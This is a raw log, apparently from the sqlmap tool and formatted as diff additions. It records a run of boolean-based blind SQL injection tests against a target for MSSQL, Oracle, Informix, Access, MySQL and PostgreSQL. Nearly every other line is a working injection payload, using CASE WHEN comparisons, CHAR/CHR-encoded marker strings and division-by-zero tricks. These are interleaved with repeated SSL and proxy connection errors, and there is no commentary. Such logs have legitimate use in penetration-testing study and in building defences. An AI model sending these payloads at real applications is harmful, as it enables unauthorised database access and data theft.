+[08:25:06] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:06] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:06] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:06] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
+[08:25:06] [PAYLOAD] '  (SELECT (CASE WHEN (8026=4958) THEN 8026 ELSE 8026*(SELECT 8026 UNION ALL SELECT 4958) END))-- -
+[08:25:06] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:06] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:06] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:06] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:06] [PAYLOAD] '  (SELECT (CASE WHEN (6691=6691) THEN 6691 ELSE 6691*(SELECT 6691 UNION ALL SELECT 2001) END))-- -
+[08:25:07] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:07] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:07] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:07] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:07] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
+[08:25:07] [PAYLOAD] '  (SELECT (CASE WHEN (5276=7715) THEN CHAR(112)+CHAR(108)+CHAR(67)+CHAR(70)+CHAR(114)+CHAR(69)+CHAR(56)+CHAR(79)+CHAR(121)+CHAR(82)+CHAR(65)+CHAR(104)+CHAR(50)+CHAR(57)+CHAR(57)+CHAR(57)+CHAR(110)+CHAR(53)+CHAR(77)+CHAR(74)+CHAR(114)+CHAR(103)+CHAR(71)+CHAR(107)+CHAR(119)+CHAR(108)+CHAR(50)+CHAR(71)+CHAR(52)+CHAR(118)+CHAR(115)+CHAR(75)+CHAR(97)+CHAR(104)+CHAR(81)+CHAR(103)+CHAR(53)+CHAR(101)+CHAR(75)+CHAR(111) ELSE 5276*(SELECT 5276 UNION ALL SELECT 7715) END))-- -
+[08:25:07] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:07] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:07] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:07] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:07] [PAYLOAD] '  (SELECT (CASE WHEN (7300=7300) THEN CHAR(112)+CHAR(108)+CHAR(67)+CHAR(70)+CHAR(114)+CHAR(69)+CHAR(56)+CHAR(79)+CHAR(121)+CHAR(82)+CHAR(65)+CHAR(104)+CHAR(50)+CHAR(57)+CHAR(57)+CHAR(57)+CHAR(110)+CHAR(53)+CHAR(77)+CHAR(74)+CHAR(114)+CHAR(103)+CHAR(71)+CHAR(107)+CHAR(119)+CHAR(108)+CHAR(50)+CHAR(71)+CHAR(52)+CHAR(118)+CHAR(115)+CHAR(75)+CHAR(97)+CHAR(104)+CHAR(81)+CHAR(103)+CHAR(53)+CHAR(101)+CHAR(75)+CHAR(111) ELSE 7300*(SELECT 7300 UNION ALL SELECT 2485) END))-- -
+[08:25:08] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:08] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:08] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:08] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:08] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
+[08:25:08] [PAYLOAD] '  (SELECT (CASE WHEN (5606=3404) THEN 5606 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:25:08] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:08] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:08] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:08] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:08] [PAYLOAD] '  (SELECT (CASE WHEN (6840=6840) THEN 6840 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:25:09] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:09] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:09] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:09] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:09] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
+[08:25:09] [PAYLOAD] '  (SELECT (CASE WHEN (4646=7284) THEN CHR(112)||CHR(108)||CHR(67)||CHR(70)||CHR(114)||CHR(69)||CHR(56)||CHR(79)||CHR(121)||CHR(82)||CHR(65)||CHR(104)||CHR(50)||CHR(57)||CHR(57)||CHR(57)||CHR(110)||CHR(53)||CHR(77)||CHR(74)||CHR(114)||CHR(103)||CHR(71)||CHR(107)||CHR(119)||CHR(108)||CHR(50)||CHR(71)||CHR(52)||CHR(118)||CHR(115)||CHR(75)||CHR(97)||CHR(104)||CHR(81)||CHR(103)||CHR(53)||CHR(101)||CHR(75)||CHR(111) ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:25:09] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:09] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:09] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:09] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:09] [PAYLOAD] '  (SELECT (CASE WHEN (8723=8723) THEN CHR(112)||CHR(108)||CHR(67)||CHR(70)||CHR(114)||CHR(69)||CHR(56)||CHR(79)||CHR(121)||CHR(82)||CHR(65)||CHR(104)||CHR(50)||CHR(57)||CHR(57)||CHR(57)||CHR(110)||CHR(53)||CHR(77)||CHR(74)||CHR(114)||CHR(103)||CHR(71)||CHR(107)||CHR(119)||CHR(108)||CHR(50)||CHR(71)||CHR(52)||CHR(118)||CHR(115)||CHR(75)||CHR(97)||CHR(104)||CHR(81)||CHR(103)||CHR(53)||CHR(101)||CHR(75)||CHR(111) ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)-- -
+[08:25:10] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:10] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:10] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:10] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:10] [INFO] testing 'Informix boolean-based blind - Parameter replace'
+[08:25:10] [PAYLOAD] '  (SELECT (CASE WHEN (8646=3019) THEN 8646 ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)-- -
+[08:25:11] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:11] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:11] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:11] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:11] [PAYLOAD] '  (SELECT (CASE WHEN (7428=7428) THEN 7428 ELSE 1/0 END) FROM SYSMASTER:SYSDUAL)-- -
+[08:25:11] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:11] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:11] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:11] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:11] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
+[08:25:11] [PAYLOAD] '  (SELECT (CASE WHEN (8630=4961) THEN 'plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ELSE 8630 END) FROM SYSMASTER:SYSDUAL)-- -
+[08:25:12] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:12] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:12] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:12] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:12] [PAYLOAD] '  (SELECT (CASE WHEN (4736=4736) THEN 'plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ELSE 4736 END) FROM SYSMASTER:SYSDUAL)-- -
+[08:25:12] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:12] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:12] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:12] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:12] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
+[08:25:12] [PAYLOAD] '  IIF(6571=8107,6571,1/0)-- -
+[08:25:13] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:13] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:13] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:13] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:13] [PAYLOAD] '  IIF(9773=9773,9773,1/0)-- -
+[08:25:13] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:13] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:13] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:13] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:13] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
+[08:25:13] [PAYLOAD] '  IIF(8465=8900,CHR(112)&CHR(108)&CHR(67)&CHR(70)&CHR(114)&CHR(69)&CHR(56)&CHR(79)&CHR(121)&CHR(82)&CHR(65)&CHR(104)&CHR(50)&CHR(57)&CHR(57)&CHR(57)&CHR(110)&CHR(53)&CHR(77)&CHR(74)&CHR(114)&CHR(103)&CHR(71)&CHR(107)&CHR(119)&CHR(108)&CHR(50)&CHR(71)&CHR(52)&CHR(118)&CHR(115)&CHR(75)&CHR(97)&CHR(104)&CHR(81)&CHR(103)&CHR(53)&CHR(101)&CHR(75)&CHR(111),1/0)-- -
+[08:25:14] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:14] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:14] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:14] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:14] [PAYLOAD] '  IIF(8763=8763,CHR(112)&CHR(108)&CHR(67)&CHR(70)&CHR(114)&CHR(69)&CHR(56)&CHR(79)&CHR(121)&CHR(82)&CHR(65)&CHR(104)&CHR(50)&CHR(57)&CHR(57)&CHR(57)&CHR(110)&CHR(53)&CHR(77)&CHR(74)&CHR(114)&CHR(103)&CHR(71)&CHR(107)&CHR(119)&CHR(108)&CHR(50)&CHR(71)&CHR(52)&CHR(118)&CHR(115)&CHR(75)&CHR(97)&CHR(104)&CHR(81)&CHR(103)&CHR(53)&CHR(101)&CHR(75)&CHR(111),1/0)-- -
+[08:25:14] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:14] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:14] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:14] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:14] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[08:25:14] [PAYLOAD] '  (CASE WHEN (3715=6125) THEN 3715 ELSE 3715*(SELECT 3715 FROM DUAL UNION SELECT 6125 FROM DUAL) END)-- -
+[08:25:15] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:15] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:15] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:15] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:15] [PAYLOAD] '  (CASE WHEN (2714=2714) THEN 2714 ELSE 2714*(SELECT 2714 FROM DUAL UNION SELECT 4467 FROM DUAL) END)-- -
+[08:25:15] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:15] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:15] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:15] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:15] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
+[08:25:15] [PAYLOAD] '  (CASE WHEN (9585=3348) THEN 'plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ELSE 9585*(SELECT 9585 FROM DUAL UNION SELECT 3348 FROM DUAL) END)-- -
+[08:25:16] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:16] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:16] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:16] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:16] [PAYLOAD] '  (CASE WHEN (8060=8060) THEN 'plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ELSE 8060*(SELECT 8060 FROM DUAL UNION SELECT 1297 FROM DUAL) END)-- -
+[08:25:16] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:16] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:16] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:16] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:16] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[08:25:16] [PAYLOAD] '  (CASE WHEN 9612=8384 THEN 9612 ELSE NULL END)-- -
+[08:25:17] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:17] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:17] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:17] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:17] [PAYLOAD] '  (CASE WHEN 5056=5056 THEN 5056 ELSE NULL END)-- -
+[08:25:18] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:18] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:18] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:18] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:18] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
+[08:25:18] [PAYLOAD] '  (CASE WHEN 4296=7254 THEN 'plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ELSE NULL END)-- -
+[08:25:18] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:18] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:18] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:18] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:18] [PAYLOAD] '  (CASE WHEN 6913=6913 THEN 'plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ELSE NULL END)-- -
+[08:25:19] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:19] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:19] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:19] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:19] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
+[08:25:19] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(SELECT (CASE WHEN (9857=7512) THEN 1 ELSE 9857*(SELECT 9857 FROM INFORMATION_SCHEMA.PLUGINS) END))-- -
+[08:25:19] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:19] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:19] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:19] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:19] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(SELECT (CASE WHEN (9075=9075) THEN 1 ELSE 9075*(SELECT 9075 FROM INFORMATION_SCHEMA.PLUGINS) END))-- -
+[08:25:20] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:20] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:20] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:20] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:20] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
+[08:25:20] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(SELECT (CASE WHEN (3621=1823) THEN 0x706c43467245384f79524168323939396e354d4a7267476b776c32473476734b6168516735654b6f ELSE 3621*(SELECT 3621 FROM INFORMATION_SCHEMA.PLUGINS) END))-- -
+[08:25:20] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:20] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:20] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:20] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:20] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(SELECT (CASE WHEN (4461=4461) THEN 0x706c43467245384f79524168323939396e354d4a7267476b776c32473476734b6168516735654b6f ELSE 4461*(SELECT 4461 FROM INFORMATION_SCHEMA.PLUGINS) END))-- -
+[08:25:21] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:25:21] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:21] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:21] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:25:21] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
+[08:25:21] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ,(SELECT (CASE WHEN (8010=1884) THEN 1 ELSE 1/(SELECT 0) END))-- -
